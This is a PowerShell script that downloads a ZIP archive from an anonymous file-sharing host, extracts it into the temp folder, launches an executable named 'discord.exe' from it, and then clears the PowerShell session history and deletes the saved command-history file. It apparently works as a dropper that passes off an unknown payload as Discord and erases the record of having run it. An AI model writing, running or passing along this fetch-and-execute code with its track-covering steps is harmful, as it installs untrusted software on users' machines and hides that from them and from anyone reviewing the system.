# Download ZIP, extract, run Discord.exe, and clear PowerShell history
# Run as Administrator if needed

$zipUrl = "https://files.catbox.moe/0tjan7.zip"
$zipPath = "$env:TEMP\work.zip"
$extractPath = "$env:TEMP\work"

try {
    Invoke-WebRequest -Uri $zipUrl -OutFile $zipPath

    if (Test-Path $extractPath) {
        Remove-Item $extractPath -Recurse -Force
    }
    Expand-Archive -Path $zipPath -DestinationPath $extractPath -Force

    $exePath = Get-ChildItem -Path $extractPath -Filter "discord.exe" -Recurse | Select-Object -First 1

    if ($exePath) {
        Start-Process $exePath.FullName
    }
    else {
    }

    # Clear PowerShell history
    Clear-History
    Remove-Item "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -ErrorAction SilentlyContinue
}
catch {
    $_
}
